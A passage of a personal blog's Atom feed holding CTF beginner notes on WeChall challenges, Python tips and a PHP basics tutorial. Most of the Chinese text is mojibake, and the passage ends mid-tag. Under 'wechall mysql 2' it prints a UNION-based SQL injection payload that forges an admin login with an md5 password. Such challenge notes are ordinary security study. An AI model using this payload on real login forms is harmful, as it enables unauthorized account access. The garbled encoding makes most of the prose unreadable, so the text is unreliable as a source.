      &lt;h4 id=&quot;wechall-register-globals&quot;&gt;&lt;a href=&quot;#wechall-register-globals&quot; class=&quot;headerlink&quot; title=&quot;wechall register_globals&quot;&gt;&lt;/a&gt;wechall register_globals&lt;/h4&gt;&lt;p&gt;register_globals åœ¨php 5.4.0 åè¢«ç§»é™¤ å…¶ä¼šè‡ªåŠ¨ç”Ÿæˆå„ç§å˜é‡ å¦‚htmlè¯·æ±‚å˜é‡&lt;br&gt;&lt;a href=&quot;http://1.1.1.1/report.asp?id=123&amp;amp;kehu=222&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://1.1.1.1/report.asp?id=123&amp;amp;kehu=222&lt;/a&gt;&lt;br&gt;login[0]=admin ç›´æ¥login=admin åªå–ç¬¬ä¸€ç¬¬äºŒä¸ªå­—ç¬¦&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;hackthebox&quot;&gt;&lt;a href=&quot;#hackthebox&quot; class=&quot;headerlink&quot; title=&quot;hackthebox&quot;&gt;&lt;/a&gt;hackthebox&lt;/h4&gt;&lt;p&gt;invite challenge æµè§ˆå™¨console ä¸‹è¿è¡Œå‡½æ•° åŠ ï¼ˆï¼‰&lt;br&gt;curl -X POST https://â€¦&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFå…¥é—¨ WECALL2-æ­£åˆ™</title>
    <link href="http://finsenty54.github.io/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/"/>
    <id>http://finsenty54.github.io/2020/07/06/CTFå…¥é—¨ WECALL2/</id>
    <published>2020-07-06T05:54:43.000Z</published>
    <updated>2020-07-06T06:01:18.207Z</updated>
    
    <content type="html"><![CDATA[<p>python3<br>list()   ä¸€ä¸ªå­—ç¬¦å­—ç¬¦åˆ†</p><hr><p>child[a],child[b] = child[b],child[a]</p><h5 id="äº¤æ¢ä½ç½®"><a href="#äº¤æ¢ä½ç½®" class="headerlink" title="äº¤æ¢ä½ç½®"></a>äº¤æ¢ä½ç½®</h5><a id="more"></a><hr><p>spilt() æŒ‰ç©ºæ ¼åˆ†<br>int()</p><hr><h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/" target="_blank" rel="noopener">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p><h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(â€˜/root/Documents/CTF_WECALL/results.pyâ€™, mode = â€˜wâ€™,encoding=â€™utf-8â€™)</p><p>æ‰“å°åˆ°æ–‡ä»¶ä¸­</p><p>line breaks. æ¢è¡Œç¬¦</p><p>vscode python æ•´æ®µå³ç§» é€‰ä¸­tab</p><hr><h3 id="python-2-è½¬åˆ°-3"><a href="#python-2-è½¬åˆ°-3" class="headerlink" title="python 2 è½¬åˆ° 3"></a>python 2 è½¬åˆ° 3</h3><p>2to3.py</p><hr><h3 id="æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ "><a href="#æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ " class="headerlink" title="æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ "></a>æ­£åˆ™30åˆ†é’Ÿå­¦ä¹ </h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm" target="_blank" rel="noopener">https://deerchao.cn/tutorials/regex/regex.htm</a></p><h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>â€˜ union select 1,â€™adminâ€™ ,md5(â€˜1â€™)  from users where username =â€™adminâ€™#</p><p><code>ï¼Ÿï¼Ÿå¯ä»¥éšä¾¿é€‰æ‹©</code></p><h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:ç«¯å£å· ç”¨äºæŸ¥çœ‹æŸä¸€ç«¯å£çš„å ç”¨æƒ…å†µï¼Œæ¯”å¦‚æŸ¥çœ‹8000ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œlsof -i:8000</p><p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python3&lt;br&gt;list()   ä¸€ä¸ªå­—ç¬¦å­—ç¬¦åˆ†&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;child[a],child[b] = child[b],child[a]&lt;/p&gt;
&lt;h5 id=&quot;äº¤æ¢ä½ç½®&quot;&gt;&lt;a href=&quot;#äº¤æ¢ä½ç½®&quot; class=&quot;headerlink&quot; title=&quot;äº¤æ¢ä½ç½®&quot;&gt;&lt;/a&gt;äº¤æ¢ä½ç½®&lt;/h5&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://finsenty54.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFå…¥é—¨ WECALL 2</title>
    <link href="http://finsenty54.github.io/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/"/>
    <id>http://finsenty54.github.io/2020/05/19/CTFå…¥é—¨ WECALL1/</id>
    <published>2020-05-19T12:03:39.000Z</published>
    <updated>2020-05-19T12:07:49.772Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯PHPæ–‡ä»¶ï¼Ÿ</h3><p>PHPæ–‡ä»¶å¯ä»¥åŒ…å«æ–‡æœ¬ï¼ŒHTMLï¼ŒCSSï¼ŒJavaScriptå’ŒPHPä»£ç <br>PHPä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯HTMLæ ¼å¼è¿”å›åˆ°æµè§ˆå™¨<br>PHPæ–‡ä»¶çš„æ‰©å±•åä¸ºâ€œ .phpâ€</p><a id="more"></a><h3 id="PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ"><a href="#PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ"></a>PHPå¯ä»¥åšä»€ä¹ˆï¼Ÿ</h3><p>PHPå¯ä»¥ç”ŸæˆåŠ¨æ€é¡µé¢å†…å®¹<br>PHPå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºï¼Œæ‰“å¼€ï¼Œè¯»å–ï¼Œå†™å…¥ï¼Œåˆ é™¤å’Œå…³é—­æ–‡ä»¶<br>PHPå¯ä»¥æ”¶é›†è¡¨å•æ•°æ®<br>PHPå¯ä»¥å‘é€å’Œæ¥æ”¶Cookie<br>PHPå¯ä»¥æ·»åŠ ï¼Œåˆ é™¤ï¼Œä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®<br>PHPå¯ç”¨äºæ§åˆ¶ç”¨æˆ·è®¿é—®<br>PHPå¯ä»¥åŠ å¯†æ•°æ®<br>ä½¿ç”¨PHPï¼Œæ‚¨ä¸ä»…å¯ä»¥è¾“å‡ºHTMLã€‚æ‚¨å¯ä»¥è¾“å‡ºå›¾åƒï¼ŒPDFæ–‡ä»¶ç”šè‡³Flashç”µå½±ã€‚æ‚¨è¿˜å¯ä»¥è¾“å‡ºä»»ä½•æ–‡æœ¬ï¼Œä¾‹å¦‚XHTMLå’ŒXMLã€‚</p><p>PHPè„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ã€‚<br>PHPè„šæœ¬çš„å¼€å¤´<code>&lt;?php</code>å’Œç»“å°¾æ˜¯<code>?&gt;</code>ï¼š<br>&lt;?php<br>// PHP code goes here<br>?&gt;<br>PHPæ–‡ä»¶çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åæ˜¯â€œ .phpâ€ã€‚<br>ä¸€ä¸ªPHPæ–‡ä»¶é€šå¸¸åŒ…å«HTMLæ ‡è®°å’Œä¸€äº›PHPè„šæœ¬ä»£ç ã€‚</p><p> PHPè¯­å¥ä»¥åˆ†å·ï¼ˆ<code>;</code>ï¼‰ç»“å°¾ã€‚</p><p>åœ¨PHPä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚ifï¼Œ elseï¼Œwhileï¼Œ echoç­‰ï¼‰ï¼Œç±»ï¼Œå‡½æ•°ï¼Œå’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°<code>æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚</code></p><p>æ‰€æœ‰<code>å˜é‡åç§°å‡åŒºåˆ†å¤§å°å†™</code>ï¼</p><p>comment<br>//<br>#<br>/<em>        </em>/</p><p>åœ¨PHPä¸­ï¼Œå˜é‡ä»¥$ç¬¦å·å¼€å¤´ï¼Œåè·Ÿå˜é‡åç§°</p><p>ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸åŒï¼ŒPHPæ²¡æœ‰ç”¨äºå£°æ˜å˜é‡çš„å‘½ä»¤ã€‚å®ƒæ˜¯åœ¨æ‚¨é¦–æ¬¡ä¸ºå…¶åˆ†é…å€¼æ—¶åˆ›å»ºçš„ã€‚</p><p>&lt;?php<br>$txt = â€œW3Schools.comâ€;<br>echo â€œI love $txt!â€;<br>?&gt;</p><p>&lt;?php<br>$txt = â€œW3Schools.comâ€;<br>echo â€œI love â€œ . $txt . â€œ!â€;<br>?&gt;</p><p>&lt;?php<br>$x = 5;<br>$y = 4;<br>echo $x + $y;<br>?&gt;</p><h5 id="åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®"><a href="#åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®" class="headerlink" title="åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®"></a>åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡å…·æœ‰å…¨å±€èŒƒå›´ï¼Œå¹¶ä¸”åªèƒ½åœ¨å‡½æ•°å¤–éƒ¨è®¿é—®</h5><h5 id="åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®"><a href="#åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®" class="headerlink" title="åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®"></a>åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡å…·æœ‰å±€éƒ¨èŒƒå›´ï¼Œåªèƒ½åœ¨è¯¥å‡½æ•°å†…è®¿é—®</h5><h5 id="globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚"><a href="#globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚" class="headerlink" title="globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚"></a>globalå…³é”®å­—ç”¨äºåœ¨å‡½æ•°å†…éƒ¨è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ã€‚</h5><p>ä¸ºæ­¤ï¼Œè¯·globalåœ¨å˜é‡ä¹‹å‰ï¼ˆåœ¨å‡½æ•°å†…éƒ¨ï¼‰ä½¿ç”¨å…³é”®å­—<br>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  global $x, $y;<br>  $y = $x + $y;<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.</p><p>&lt;?php<br>$x = 5;<br>$y = 10;<br>function myTest() {<br>  $GLOBALS[â€˜yâ€™] = $GLOBALS[â€˜xâ€™] + $GLOBALS[â€˜yâ€™];<br>}<br>myTest();<br>echo $y; // outputs 15<br>?&gt;</p><p>é€šå¸¸ï¼Œå½“ä¸€ä¸ªå‡½æ•°å®Œæˆ/æ‰§è¡Œæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡éƒ½ä¼šè¢«åˆ é™¤ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æˆ‘ä»¬å¸Œæœ›ä¸åˆ é™¤å±€éƒ¨å˜é‡ã€‚æˆ‘ä»¬éœ€è¦å®ƒæ¥åšè¿›ä¸€æ­¥çš„å·¥ä½œã€‚<br>ä¸ºæ­¤ï¼Œè¯·staticåœ¨é¦–æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨å…³é”®å­—<br>ç„¶åï¼Œæ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡ä»å°†å…·æœ‰è‡ªä¸Šæ¬¡è°ƒç”¨è¯¥å‡½æ•°ä»¥æ¥æ‰€åŒ…å«çš„ä¿¡æ¯ã€‚<br>æ³¨æ„ï¼šè¯¥å˜é‡ä»ç„¶æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>å·®å¼‚å¾ˆå°ï¼šechoæ²¡æœ‰è¿”å›å€¼ï¼Œè€Œprintè¿”å›å€¼ä¸º1ï¼Œå› æ­¤å¯ä»¥åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚echoå¯ä»¥é‡‡ç”¨å¤šä¸ªå‚æ•°ï¼ˆå°½ç®¡è¿™ç§ç”¨æ³•å¾ˆå°‘è§ï¼‰ï¼Œè€Œprintå¯ä»¥é‡‡ç”¨ä¸€ä¸ªå‚æ•°ã€‚echoæ¯”å¿«ä¸€ç‚¹printã€‚</p><p>&lt;?php<br>echo â€œ</p><h2>PHP is Fun!</h2>â€œ;<br>echo â€œHello world!<br>â€œ;<br>echo â€œIâ€™m about to learn PHP!<br>â€œ;<br>echo â€œThis â€œ, â€œstring â€œ, â€œwas â€œ, â€œmade â€œ, â€œwith multiple parameters.â€;<br>?&gt;<p></p><h5 id="å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·"><a href="#å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·" class="headerlink" title="å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·"></a>å­—ç¬¦ä¸²å¯ä»¥æ˜¯å¼•å·å†…çš„ä»»ä½•æ–‡æœ¬ã€‚å¯ä»¥ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·</h5><p>æ•´æ•°æ•°æ®ç±»å‹æ˜¯-2,147,483,648å’Œ2,147,483,647ä¹‹é—´çš„éåè¿›åˆ¶æ•°ã€‚<br>PHP var_dumpï¼ˆï¼‰å‡½æ•°è¿”å›æ•°æ®ç±»å‹å’Œå€¼</p><p>&lt;?php<br>$cars = array(â€œVolvoâ€,â€BMWâ€,â€Toyotaâ€);<br>var_dump($cars);<br>?&gt;</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»å£°æ˜ä¸€ä¸ªå¯¹è±¡ç±»ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨classå…³é”®å­—ã€‚ç±»æ˜¯å¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•çš„ç»“æ„ï¼š<br>&lt;?php<br>class Car {<br>  function Car() {<br>    $this-&gt;model = â€œVWâ€;<br>  }<br>}<br>// create an object<br>$herbie = new Car();<br>// show object properties<br>echo $herbie-&gt;model;<br>?&gt;</p><p>å¦‚æœåˆ›å»ºçš„å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šè‡ªåŠ¨ä¸ºå…¶åˆ†é…å€¼NULLã€‚<br>ä¹Ÿå¯ä»¥é€šè¿‡å°†å€¼è®¾ç½®ä¸ºNULLæ¥æ¸…ç©ºå˜é‡ï¼š</p><p>å…³äºPHPçš„æ³¨æ„äº‹é¡¹ä¹‹ä¸€æ˜¯å®ƒæä¾›äº†è‡ªåŠ¨æ•°æ®ç±»å‹è½¬æ¢ã€‚<br>å› æ­¤ï¼Œå¦‚æœå°†æ•´æ•°å€¼åˆ†é…ç»™å˜é‡ï¼Œåˆ™è¯¥å˜é‡çš„ç±»å‹å°†è‡ªåŠ¨ä¸ºæ•´æ•°ã€‚ç„¶åï¼Œå¦‚æœå°†å­—ç¬¦ä¸²åˆ†é…ç»™ç›¸åŒçš„å˜é‡ï¼Œåˆ™ç±»å‹å°†æ›´æ”¹ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>æ•´æ•°å¯ä»¥ä»¥ä¸‰ç§æ ¼å¼æŒ‡å®šï¼šåè¿›åˆ¶ï¼ˆåŸºäº10çš„ï¼‰ï¼Œåå…­è¿›åˆ¶ï¼ˆåŸºäº16çš„-å¸¦æœ‰0xå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆåŸºäº8çš„-å¸¦æœ‰0å‰ç¼€ï¼‰</p><p>ï¼ˆintï¼‰ï¼Œï¼ˆintegerï¼‰æˆ–intvalï¼ˆï¼‰å‡½æ•°é€šå¸¸ç”¨äºå°†å€¼è½¬æ¢ä¸ºæ•´æ•°ã€‚</p><p>æœ‰æ•ˆçš„å¸¸é‡åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆå¸¸é‡åç§°å‰æ²¡æœ‰$ç¬¦å·ï¼‰ã€‚</p><p>æ³¨æ„ï¼šä¸å˜é‡ä¸åŒï¼Œå¸¸é‡åœ¨æ•´ä¸ªè„šæœ¬ä¸­è‡ªåŠ¨ä¸ºå…¨å±€å˜é‡ã€‚<br>define(name, value, case-insensitive)<br>åœ¨PHP7ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨define()å‡½æ•°åˆ›å»ºä¸€ä¸ªArrayå¸¸é‡ã€‚</p><p>.    Concatenation    $txt1 . $txt2    Concatenation of $txt1 and $txt2<br>.=    Concatenation assignment    $txt1 .= $txt2    Appends $txt2 to $txt1</p><p>&lt;?php<br>$t = date(â€œHâ€);</p><p>if ($t &lt; â€œ20â€) {<br>  echo â€œHave a good day!â€;<br>}<br>?&gt;</p><h4 id="è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®-å€¼å¯¹ã€‚"><a href="#è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®-å€¼å¯¹ã€‚" class="headerlink" title="è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®/å€¼å¯¹ã€‚"></a>è¯¥foreachå¾ªç¯ä»…é€‚ç”¨äºæ•°ç»„ï¼Œç”¨äºå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®/å€¼å¯¹ã€‚</h4><p>å¥æ³•<br>foreach ($array as $value) {<br>  code to be executed;<br>}<br>å¯¹äºæ¯æ¬¡å¾ªç¯è¿­ä»£ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼éƒ½åˆ†é…ç»™$ valueï¼Œå¹¶ä¸”æ•°ç»„æŒ‡é’ˆç§»åŠ¨ä¸€ä¸ªï¼Œç›´åˆ°åˆ°è¾¾æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ ã€‚</p><p>è¦æŒ‡å®šï¼Œstrictæˆ‘ä»¬éœ€è¦è®¾ç½®declare(strict_types=1);ã€‚è¿™å¿…é¡»åœ¨PHPæ–‡ä»¶çš„ç¬¬ä¸€è¡Œã€‚<br>è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªåœ¨å£°æ˜å‡½æ•°æ—¶æŒ‡å®šæ‰€éœ€æ•°æ®ç±»å‹çš„é€‰é¡¹ï¼Œå¹¶ä¸”é€šè¿‡æ·»åŠ strict å£°æ˜ï¼Œå¦‚æœæ•°æ®ç±»å‹ä¸åŒ¹é…ï¼Œå®ƒå°†æŠ›å‡ºâ€œè‡´å‘½é”™è¯¯â€ã€‚</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : float {<br>  return $a + $b;<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php declare(strict_types=1); // strict requirement<br>function addNumbers(float $a, float $b) : int {<br>  return (int)($a + $b);<br>}<br>echo addNumbers(1.2, 5.2);<br>?&gt;</p><p>&lt;?php<br>$cars = array(â€œVolvoâ€, â€œBMWâ€, â€œToyotaâ€);<br>echo â€œI like â€œ . $cars[0] . â€œ, â€œ . $cars[1] . â€œ and â€œ . $cars[2] . â€œ.â€;<br>?&gt;</p><p>å…³è”æ•°ç»„æ˜¯ä½¿ç”¨åˆ†é…ç»™å®ƒä»¬çš„å‘½åé”®çš„æ•°ç»„ã€‚<br>æœ‰ä¸¤ç§åˆ›å»ºå…³è”æ•°ç»„çš„æ–¹æ³•ï¼š<br>$age = array(â€œPeterâ€=&gt;â€35â€, â€œBenâ€=&gt;â€37â€, â€œJoeâ€=&gt;â€43â€);<br>è¦ä¹ˆï¼š<br>$age[â€˜Peterâ€™] = â€œ35â€;<br>$age[â€˜Benâ€™] = â€œ37â€;<br>$age[â€˜Joeâ€™] = â€œ43â€;<br>ç„¶åå¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨å‘½åçš„é”®ï¼š</p><p>$cars = array (<br>  array(â€œVolvoâ€,22,18),<br>  array(â€œBMWâ€,15,13),<br>  array(â€œSaabâ€,5,2),<br>  array(â€œLand Roverâ€,17,15)<br>);<br>&lt;?php<br>echo $cars[0][0].â€: In stock: â€œ.$cars[0][1].â€, sold: â€œ.$cars[0][2].â€.<br>â€œ;<br>echo $cars[1][0].â€: In stock: â€œ.$cars[1][1].â€, sold: â€œ.$cars[1][2].â€.<br>â€œ;<br>echo $cars[2][0].â€: In stock: â€œ.$cars[2][1].â€, sold: â€œ.$cars[2][2].â€.<br>â€œ;<br>echo $cars[3][0].â€: In stock: â€œ.$cars[3][1].â€, sold: â€œ.$cars[3][2].â€.<br>â€œ;<br>?&gt;</p><p>sort() -ä»¥å‡åºæ’åˆ—æ•°ç»„<br>rsort() -ä»¥é™åºæ’åˆ—æ•°ç»„<br>asort() -æ ¹æ®å€¼ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>ksort() -æ ¹æ®é”®ä»¥å‡åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>arsort() -æ ¹æ®å€¼ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº<br>krsort() -æ ¹æ®é”®ä»¥é™åºå¯¹å…³è”æ•°ç»„è¿›è¡Œæ’åº</p><h4 id="ç”¨äºåœ¨ä½¿ç”¨method-â€œ-postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚-POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚"><a href="#ç”¨äºåœ¨ä½¿ç”¨method-â€œ-postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚-POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚" class="headerlink" title="ç”¨äºåœ¨ä½¿ç”¨method =â€œ postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚"></a>ç”¨äºåœ¨ä½¿ç”¨method =â€œ postâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚$ _POSTä¹Ÿå¹¿æ³›ç”¨äºä¼ é€’å˜é‡ã€‚</h4><h5 id="SERVER-â€˜PHP-SELFâ€™-Returns-the-filename-of-the-currently-executing-script"><a href="#SERVER-â€˜PHP-SELFâ€™-Returns-the-filename-of-the-currently-executing-script" class="headerlink" title="$_SERVER[â€˜PHP_SELFâ€™]    Returns the filename of the currently executing script"></a>$_SERVER[â€˜PHP_SELFâ€™]    Returns the filename of the currently executing script</h5><h5 id="SERVER-â€˜REQUEST-METHODâ€™-Returns-the-request-method-used-to-access-the-page-such-as-POST"><a href="#SERVER-â€˜REQUEST-METHODâ€™-Returns-the-request-method-used-to-access-the-page-such-as-POST" class="headerlink" title="$_SERVER[â€˜REQUEST_METHODâ€™]    Returns the request method used to access the page (such as POST)"></a>$_SERVER[â€˜REQUEST_METHODâ€™]    Returns the request method used to access the page (such as POST)</h5><h4 id="PHP-GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method-â€œ-getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚"><a href="#PHP-GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method-â€œ-getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚" class="headerlink" title="PHP $ _GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method =â€œ getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚"></a>PHP $ _GETæ˜¯ä¸€ä¸ªPHPè¶…çº§å…¨å±€å˜é‡ï¼Œç”¨äºåœ¨ä½¿ç”¨method =â€œ getâ€æäº¤HTMLè¡¨å•åæ”¶é›†è¡¨å•æ•°æ®ã€‚</h4><h5 id="GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚"><a href="#GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚" class="headerlink" title="$ _GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚"></a>$ _GETè¿˜å¯ä»¥æ”¶é›†åœ¨URLä¸­å‘é€çš„æ•°æ®ã€‚</h5><h4 id="ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚"><a href="#ä½¿ç”¨GETæ–¹æ³•ä»è¡¨å•å‘é€çš„ä¿¡æ¯å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼ˆæ‰€æœ‰å˜é‡åå’Œå€¼éƒ½æ˜¾ç¤ºåœ¨URLä¸­ï¼‰ã€‚GETå¯¹å‘é€çš„ä¿¡æ¯é‡ä¹Ÿæœ‰é™åˆ¶ã€‚é™åˆ¶çº¦ä¸º2000ä¸ªå­—ç¬¦ã€‚ä½†æ˜¯ï¼Œç”±äºå˜é‡æ˜¾ç¤ºåœ¨URLä¸­ï¼Œå› æ­¤å¯ä»¥ä¸ºé¡µé¢æ·»åŠ ä¹¦ç­¾ã€‚åœ¨æŸäº›æƒ…å†µä¸‹è¿™å¯èƒ½å¾ˆæœ‰ç”¨ã€‚" class="headerlink" 